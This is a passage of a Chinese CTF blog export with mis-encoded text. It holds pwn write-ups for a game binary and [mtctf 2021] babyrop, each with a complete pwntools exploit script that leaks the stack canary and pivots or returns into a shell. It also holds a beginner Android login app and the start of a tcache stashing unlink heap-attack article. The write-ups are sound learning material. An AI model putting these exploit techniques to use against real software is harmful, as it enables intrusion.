<h4 id="é¢˜ç›®åˆ†æ-9"><a href="#é¢˜ç›®åˆ†æ-9" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h4><p>è¿™é“é¢˜æ˜¯ä¸ªæ¸¸æˆé¢˜ï¼Œè¿˜æœ‰ç‚¹æ„æ€ï¼Œä¸»è¦è®²çš„æ˜¯ä¸»è§’ä½œä¸ºäººé€ äººè¢«äººç±»è§‚å¯Ÿåšå®éªŒï¼Œè¿˜æœ‰å¥½å‡ ä¸ªç»“å±€ï¼Œåœ¨ç©çš„æ—¶å€™å‘ç°è¾“å…¥å¯†ç çš„æ—¶å€™æœ‰å¥‡æ€ªçš„å­—ç¬¦ä¸²è¾“å‡º</p>
<p>åˆ¤æ–­è¿™é‡Œåº”è¯¥æ˜¯ä¸ªæº¢å‡ºç‚¹</p>
<p><img src="https://gitee.com/Nss-harukii/images/raw/master/61.png" alt="pic"></p>
<p>ç„¶åå‘ç°è¿™é‡Œä¹‹åå¦‚æœè¾“é”™å¯†ç ä¼šremakeåˆ°ç¬¬ä¸€æ¬¡è¾“å¯†ç çš„åœ°æ–¹</p>
<p><img src="https://gitee.com/Nss-harukii/images/raw/master/62.png" alt="pic"></p>
<p>è¿›å…¥IDAå‘ç°è¾“å…¥æˆ‘ä»¬åå­—çš„åœ°æ–¹ä¼šå°†æˆ‘ä»¬çš„è¾“å…¥è¯»å…¥bssæ®µ</p>
<p><img src="https://gitee.com/Nss-harukii/images/raw/master/65.png" alt="pic"></p>
<p>ä¹‹ååˆ†æå‘ç°è¾“å¯†ç çš„åœ°æ–¹åªæº¢å‡ºäº†å…«ä¸ªå­—èŠ‚,è™½ç„¶å¯ä»¥åå¤åˆ©ç”¨ä½†æ˜¯æˆ‘æ²¡æƒ³åˆ°å•¥åˆ©ç”¨æ–¹æ³•ï¼Œæ„Ÿè§‰åªèƒ½ç”¨æ¥æ³„éœ²canary</p>
<p><img src="https://gitee.com/Nss-harukii/images/raw/master/63.png" alt="pic"></p>
<p>ç»§ç»­åˆ†æå‘ç°è¿™é‡Œæº¢å‡ºäº†0x10å­—èŠ‚,å¯ä»¥ç”¨æ¥åšæ ˆè¿ç§»ï¼Œä½†æ˜¯ä¹‹å‰ç©æ¸¸æˆçš„æ—¶å€™æ²¡æœ‰å‘ç°è¿™æ¡åˆ†æ”¯ï¼Œç»è¿‡Ctrl+xè¿½è¸ªå‘ç°åªè¦åœ¨å‡ºç‰¢æˆ¿åçš„æ‰€æœ‰æœ‰é€‰æ‹©çš„åœ°æ–¹é€‰æ‹©3éšè—é€‰é¡¹å°±èƒ½è¿›å…¥è¯¥åˆ†æ”¯</p>
<p><img src="https://gitee.com/Nss-harukii/images/raw/master/64.png" alt="pic"></p>
<h4 id="å®Œæ•´exp-9"><a href="#å®Œæ•´exp-9" class="headerlink" title="å®Œæ•´exp"></a>å®Œæ•´exp</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;game&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;game&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;1.14.71.254&quot;,28039)</span></span><br><span class="line">ls = <span class="number">0x0000401256</span></span><br><span class="line">name = <span class="number">0x0000000004080C0</span></span><br><span class="line">system = <span class="number">0x401265</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000402bb3</span></span><br><span class="line">leave_ret = <span class="number">0x401337</span></span><br><span class="line">payload1 = <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x600</span> + <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + p64(pop_rdi) + p64(name + <span class="number">0x600</span>) + p64(system)</span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span> </span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;å¼€å§‹æ¸¸æˆ&quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;è¯·è¾“å…¥ä½ çš„åå­—ï¼š&quot;</span>,payload1)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;2.å¥³&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;2.æ‰“å¼€æŸœå­&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;è¿™ä¸ªæŸœå­çœ‹èµ·æ¥ååˆ†ç¬¨é‡éš¾ä»¥æ‰“å¼€ã€‚&quot;</span>,<span class="string">b&quot;&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;ç„¶è€Œå¥¹è¿˜æ˜¯å°è¯•æ‰“å¼€å®ƒã€‚&quot;</span>,<span class="string">b&quot;&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;ç›´æ¥æ‰“å¼€äº†æŸœå­ã€‚&quot;</span>,<span class="string">b&quot;&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;2.æ— è§†æé†’æ‰“å¼€å®ƒ&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;é‚£ä¹ˆå°±ç”±æˆ‘æ¥å‘Šè¯‰ä½ ä¸€äº›äº‹æƒ…å§ã€‚&quot;</span>,<span class="string">b&quot;&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;æˆ‘ä»¬æ‰€æœ‰äººéƒ½åœ¨å¯»æ‰¾å‡ºè·¯&quot;</span>,<span class="string">b&quot;&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;ä½ å¯èƒ½å°±ä¼šæƒ³èµ·æˆ‘ä»¬åˆä¸€æ¬¡è¶Šç‹±å¤±è´¥äº†ã€‚&quot;</span>,<span class="string">b&quot;&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;ä½ å°±ä¼šè®°èµ·ä¸€åˆ‡ã€‚&quot;</span>,<span class="string">b&quot;&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;æˆ‘æŠŠçº¿ç´¢è—åœ¨äº†ä½ è‡ªå·±çš„è¡£æœé‡Œã€‚&quot;</span>,<span class="string">b&quot;&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;æ¥......&quot;</span>,<span class="string">b&quot;&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;ä½ çœŸçš„ç›¸ä¿¡å®ƒæ‰€å†™çš„é‚£äº›äº‹æƒ…å—ï¼Ÿï¼‰&quot;</span>,<span class="string">b&quot;&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;åºŠä¸Šå‘å‘†ã€‚&quot;</span>,<span class="string">b&quot;&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;å¼€å§‹ç ”ç©¶èµ·æ¥ã€‚&quot;</span>,<span class="string">b&quot;&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;ä½ ä¸ºä»€ä¹ˆä¼šç›¸ä¿¡ï¼Ÿï¼‰&quot;</span>,<span class="string">b&quot;&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;2.æ°”æ¼åœ°æ’•å¼€è¡£æœ&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;åˆ†å¸ƒç€æ˜Ÿæ˜Ÿå’Œæ¨ªæ ã€‚&quot;</span>,<span class="string">b&quot;&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;,-****&quot;</span>,<span class="string">b&quot;&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;8ä½æ•°å­—å¯†ç ï¼š&quot;</span>,<span class="string">&quot;20161226&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;ä¸Šçš„åœ°æ–¹ã€‚&quot;</span>,<span class="string">b&quot;&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;å‘å‡ºäº†å£°å“ã€‚&quot;</span>,<span class="string">b&quot;&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;ä¸ªå¯†ç é”ã€‚&quot;</span>,<span class="string">b&quot;&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;å¯†ç :&quot;</span>,payload2)</span><br><span class="line"><span class="comment">#print(p.recv())</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>)</span><br><span class="line">canary = u64(p.recv(<span class="number">8</span>)) &amp; <span class="number">0xffffffffffffff00</span></span><br><span class="line">success(<span class="string">&quot;canary:&quot;</span> + <span class="built_in">hex</span>(canary))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.send(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;å¼€äº†æˆ¿é—´é—¨ã€‚&quot;</span>,<span class="string">&quot; &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot; &quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;ä¹ˆä¹Ÿæ²¡æœ‰ã€‚)&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;ä¹ˆçŸ¥é“çš„ï¼ï¼‰&quot;</span>,<span class="string">&quot; &quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;æ‰“å¼€äº†å®ƒã€‚&quot;</span>,<span class="string">b&quot;&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;åŠ¨äº†èµ·æ¥ã€‚&quot;</span>,<span class="string">b&quot;&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;æ— æ•°å°æ˜¾ç¤ºå™¨ã€‚&quot;</span>,<span class="string">b&quot;&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;éœ‡æƒŠåˆ°æ— æ³•è¨€è¯­ã€‚&quot;</span>,<span class="string">b&quot;&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;ï¼‰&quot;</span>,<span class="string">b&quot;&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;æˆ¿é—´ã€‚&quot;</span>,<span class="string">b&quot;&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;ä¸ªã€‚ï¼‰&quot;</span>,<span class="string">b&quot;&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;ç”Ÿã€‚ï¼‰&quot;</span>,<span class="string">b&quot;&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;è¶Šå­¤ç‹¬ã€‚ï¼‰&quot;</span>,<span class="string">b&quot;&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;2.è¿”å›æˆ¿é—´&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;é—´æ·±å¤„èµ°ã€‚&quot;</span>,<span class="string">b&quot;&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;è¶£çš„å®éªŒå“ã€‚ï¼‰&quot;</span>,<span class="string">b&quot;&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;è¯èµ·æ¥ã€‚&quot;</span>,<span class="string">b&quot;&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;è¯‰ä½ ä¸€åˆ‡ã€‚ï¼‰&quot;</span>,<span class="string">b&quot;&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;åœæ­¢è¿‡ã€‚ï¼‰&quot;</span>,<span class="string">b&quot;&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;ä¸­å¿ƒï¼‰&quot;</span>,<span class="string">b&quot;&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;çš„ä¸€ä»½å­äº†ã€‚ï¼‰&quot;</span>,<span class="string">b&quot;&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;æˆ‘æ„è¯†çš„ã€‚ï¼‰&quot;</span>,<span class="string">b&quot;&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;ä½œè€…å…¶å®å°±æ˜¯æˆ‘ã€‚ï¼‰&quot;</span>,<span class="string">b&quot;&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;ç„¶è¢«å›šç¦ç€ã€‚ï¼‰&quot;</span>,<span class="string">b&quot;&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;ä¸è¿‡æ™ºæ…§çš„ä½ å¯èƒ½å¹¶æ²¡æœ‰åˆ°è¾¾è¿‡é‚£é‡Œã€‚ï¼‰&quot;</span>,<span class="string">b&quot;&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;å¯Ÿä¸­å¿ƒå–å¾—çš„çªç ´ã€‚ï¼‰&quot;</span>,<span class="string">&quot; &quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;çš„å—ï¼Ÿï¼‰&quot;</span>,<span class="string">&quot; &quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;504å·&quot;</span>,<span class="string">b&quot;&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;äº†åœ°&quot;</span>,<span class="string">&quot; &quot;</span>)</span><br><span class="line">payload3 = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x18</span> + p64(canary) + p64(name + <span class="number">0x600</span>)  + p64(leave_ret)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;ä½ çš„ä¿¡æ¯ã€‚&quot;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendline(payload3) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/Nss-harukii/images/raw/master/66.png" alt="pic"></p>
<p>è¿™é‡Œæä¸€ä¸‹åœ¨bssåç§»çš„æ—¶å€™éœ€è¦æ³¨æ„rspçš„å€¼ï¼Œå¦‚æœåç§»å°äº†ä¼šå¯¼è‡´rspä½äºä¸€ä¸ªæ²¡æœ‰æƒé™çš„æ®µä¸Šå¯¼è‡´æ‰“ä¸é€š</p>
<h2 id="2021-12-14"><a href="#2021-12-14" class="headerlink" title="2021-12-14"></a>2021-12-14</h2><h3 id="mtctf-2021-babyrop"><a href="#mtctf-2021-babyrop" class="headerlink" title="[mtctf 2021]babyrop"></a>[mtctf 2021]babyrop</h3><p><a href="https://gitee.com/Nss-harukii/images/raw/master/babyrop_b8c859f09c93d1e14748df020c7ee5b2.zip">é™„ä»¶</a></p>
<p>ä¸€é“ç®€å•çš„ropï¼Œè€ƒçš„åº”è¯¥æ˜¯æ ˆè¿ç§»ï¼Œä½†æ˜¯ç”¨ret2text+oneä¹Ÿä¸€æ ·å¯ä»¥åšå‡ºæ¥</p>
<h4 id="é¢˜ç›®åˆ†æ-10"><a href="#é¢˜ç›®åˆ†æ-10" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h4><p><img src="https://gitee.com/Nss-harukii/images/raw/master/67.png" alt="pic"></p>
<p>è¿™é‡Œåœ¨è¾“å…¥nameçš„æ—¶å€™ä¼šæº¢å‡ºä¸€ä¸ªå­—èŠ‚ï¼Œé€šè¿‡è¿™ä¸ªæº¢å‡ºæˆ‘ä»¬å¯ä»¥æ³„éœ²å‡ºcanary</p>
<p>ç„¶åè¿›å…¥ifåˆ¤æ–­è¿›å…¥vulnå‡½æ•°</p>
<p><img src="https://gitee.com/Nss-harukii/images/raw/master/68.png" alt="pic"></p>
<p>è¿™é‡Œå­˜åœ¨æº¢å‡ºï¼Œä½†æ˜¯ä¸è¶³ä»¥æˆ‘ä»¬è¿›è¡Œret2libc,é‚£ä¹ˆé¦–å…ˆæƒ³åˆ°æ ˆè¿ç§»ã€‚ä½†æ˜¯è¿™é“é¢˜å¯ä»¥é€šè¿‡<code>printf(stdout)</code>çš„æ–¹å¼æ³„éœ²å‡ºlibcç„¶åæ‰“one</p>
<p>æˆ‘ä»¬å°†vulnçš„rbpçš„å€¼è¦†ç›–ä¸º<code>stdout+0x20</code>,ç„¶ååŠ«æŒç¨‹åºåˆ°è¿™é‡Œ</p>
<p><img src="https://gitee.com/Nss-harukii/images/raw/master/69.png" alt="pic"></p>
<p>è¿™æ ·å°±èƒ½å¤ŸæˆåŠŸæ³„éœ²å‡ºlibcçš„åœ°å€ï¼Œç„¶åç»§ç»­æ‰§è¡Œç¨‹åºåˆ°vulnç„¶åæ‰“one</p>
<h4 id="å®Œæ•´exp-10"><a href="#å®Œæ•´exp-10" class="headerlink" title="å®Œæ•´exp"></a>å®Œæ•´exp</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;babyrop&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.27.so&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;babyrop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x19</span></span><br><span class="line">payload2 = <span class="string">b&#x27;4196782&#x27;</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;name?&#x27;</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x19</span>)</span><br><span class="line">canary = u64(p.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) </span><br><span class="line">success(<span class="string">&quot;canary:&quot;</span>+<span class="built_in">hex</span>(canary))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;enge&#x27;</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">payload3 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span> + p64(canary) + p64(<span class="number">0x601010</span>+<span class="number">0x20</span>)  + p64(<span class="number">0x400818</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;message&#x27;</span>)</span><br><span class="line">p.sendline(payload3)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Hello, &#x27;</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x3ec760</span></span><br><span class="line">success(<span class="string">&quot;libc:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">one = libc_base + <span class="number">0x4f3d5</span></span><br><span class="line">payload4 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(canary) + p64(<span class="number">0</span>) + p64(one)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;unlock this challenge&#x27;</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;message&#x27;</span>)</span><br><span class="line">p.sendline(payload4)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>ä»0å¼€å§‹çš„Androidå®‰å…¨å­¦ä¹ ä¹‹ç¬¬ä¸€ä¸ªAndroidç¨‹åº</title>
    <url>/2021/11/22/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%9A%84Android%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E7%AC%AC%E4%B8%80%E4%B8%AAAndroid%E7%A8%8B%E5%BA%8F/</url>
    <content><![CDATA[<p><img src="https://gitee.com/Nss-harukii/images/raw/master/19.jpg" alt="pic"></p>
<span id="more"></span>
<p>ä¸€æ­¥ä¸€æ­¥è·Ÿç€<a href="https://www.52pojie.cn/thread-648530-1-1.html">å¤§ä½¬æ•™ç¨‹</a>æ¥çš„</p>
<p>ç¨‹åºä¸»è¦ä»£ç </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.administrator.myapplication;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.support.v7.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    EditText Name ;         <span class="comment">//define the first input</span></span><br><span class="line">    EditText Password;     <span class="comment">//define the second input</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;   <span class="comment">//å…¥å£å‡½æ•°</span></span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        <span class="comment">// ç´¢å¼•æ§ä»¶çš„id</span></span><br><span class="line">        Name = (EditText) findViewById(R.id.name);</span><br><span class="line">        Password = (EditText) findViewById(R.id.password);</span><br><span class="line">        Button Login = (Button) findViewById(R.id.button);</span><br><span class="line">        <span class="comment">// ç›‘å¬æœ‰æ²¡æœ‰ç‚¹å‡»æŒ‰é’®æ§ä»¶ å¦‚æœç‚¹å‡»äº†å°±ä¼šæ‰§è¡ŒonClickå‡½æ•°</span></span><br><span class="line">        Login.setOnClickListener(<span class="keyword">new</span> View.OnClickListener()&#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span>  <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View view)</span></span>&#123;</span><br><span class="line">                check(Name.getText().toString().trim(),Password.getText().toString().trim());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">check</span><span class="params">(String name , String password)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(name.equals(<span class="string">&quot;haruki&quot;</span>)&amp;&amp;password.equals(<span class="string">&quot;123456&quot;</span>))&#123;</span><br><span class="line">            Toast.makeText(MainActivity.<span class="keyword">this</span>,<span class="string">&quot;ç™»å½•æˆåŠŸ&quot;</span>,Toast.LENGTH_SHORT).show(); <span class="comment">// å¼¹çª—</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            Toast.makeText(MainActivity.<span class="keyword">this</span>,<span class="string">&quot;ç™»å½•å¤±è´¥&quot;</span>,Toast.LENGTH_SHORT).show();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿è¡Œæ•ˆæœå¦‚ä¸‹</p>
<p><img src="https://gitee.com/Nss-harukii/images/raw/master/18.png" alt="pic"></p>
<p>è¯¾åä½œä¸š:ç”¨ASç¼–å†™ä¸€ä¸ªåŒ…å«å§“å å¹´é¾„ ç”Ÿæ—¥ é‚®ç®± å…´è¶£çˆ±å¥½çš„ç”¨æˆ·æ³¨å†Œé¡µé¢<br>
è¦æ±‚ï¼šç‚¹å‡»æ³¨å†ŒæŒ‰é’®ä¼šæŠŠæ³¨å†Œçš„ä¿¡æ¯æ˜¾ç¤ºåœ¨å¦ä¸€ä¸ªé¡µé¢ä¸Š</p>
]]></content>
      <categories>
        <category>é€†å‘</category>
      </categories>
  </entry>
  <entry>
    <title>tcache stashing unlink attack</title>
    <url>/2021/12/15/stash/</url>
    <content><![CDATA[<p><img src="https://gitee.com/Nss-harukii/images/raw/master/70.jpg" alt="pic"></p>
<span id="more"></span>
<h2 id="å‰è¨€"><a class="header-anchor" href="#å‰è¨€">Â¶</a>å‰è¨€</h2>
<p>æœ¬ç¯‡ä½œä¸º<code>house of pig</code>çš„å‰ç½®çŸ¥è¯†æ¥å­¦ä¹ <code>tcache stashing</code>ä¸»è¦ç ”ç©¶glibc2.27ä»¥åŠglibc2.31ä¸‹çš„åˆ©ç”¨æ–¹å¼ï¼Œä»¥åŠå‡ é“ä¾‹é¢˜</p>
<h2 id="glibc2-27-malloc-c-éƒ¨åˆ†æºç åˆ†æ"><a class="header-anchor" href="#glibc2-27-malloc-c-éƒ¨åˆ†æºç åˆ†æ">Â¶</a>glibc2.27 malloc.c éƒ¨åˆ†æºç åˆ†æ</h2>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = smallbin_index (nb);</span><br><span class="line">      bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((victim = last (bin)) != bin)</span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">	  <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">	    malloc_printerr (<span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>);</span><br><span class="line">          set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">          bin-&gt;bk = bck;</span><br><span class="line">          bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">	    set_non_main_arena (victim);</span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">	  <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">	     stash them in the tcache.  */</span></span><br><span class="line">	  <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">	  <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">	    &#123;</span><br><span class="line">	      mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">	      <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">	      <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">		     &amp;&amp; (tc_victim = last (bin)) != bin)</span><br><span class="line">		&#123;</span><br><span class="line">		  <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">		    &#123;</span><br><span class="line">		      bck = tc_victim-&gt;bk;</span><br><span class="line">		      set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">		      <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">			set_non_main_arena (tc_victim);</span><br><span class="line">		      bin-&gt;bk = bck;</span><br><span class="line">		      bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">		      tcache_put (tc_victim, tc_idx);</span><br><span class="line">	            &#125;</span><br><span class="line">		&#125;</span><br><span class="line">	    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">          <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œçš„æ¼æ´ç‚¹å°±åœ¨äºåœ¨è·å–äº†æœ€åä¸€ä¸ª<code>smallbin chunk</code>åï¼Œå¦‚æœå¯¹åº”å¤§å°çš„<code>tcache bin</code>ä¸­è¿˜æœ‰ç©ºé—²ï¼Œå°±ä¼šå°†å‰©ä¸‹çš„chunkæŒ‚è¿›<code>tcache</code>ä¸­ï¼Œå¹¶ä¸”åœ¨æŒ‚è¿›<code>tcache</code>çš„è¿‡ç¨‹ä¸­æ²¡æœ‰åšä»»ä½•çš„æ£€æŸ¥ï¼Œé‚£ä¹ˆç”±ä¸Šé¢ä»£ç çš„ç¬¬36è¡Œå°±å¯å¾—ï¼Œå¦‚æœæˆ‘ä»¬æ§åˆ¶äº†æŒ‚è¿›<code>tcache</code>ä¸­çš„<code>small bin</code>çš„<code>bk</code>ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å®ç°ä»»æ„åœ°å€ç”³è¯·</p>
<h2 id="how2heap-glibc2-27-tcache-stashing-unlink"><a class="header-anchor" href="#how2heap-glibc2-27-tcache-stashing-unlink">Â¶</a>how2heap glibc2.27 tcache stashing unlink</h2>
<h3 id="æºç "><a class="header-anchor" href="#æºç ">Â¶</a>æºç </h3>
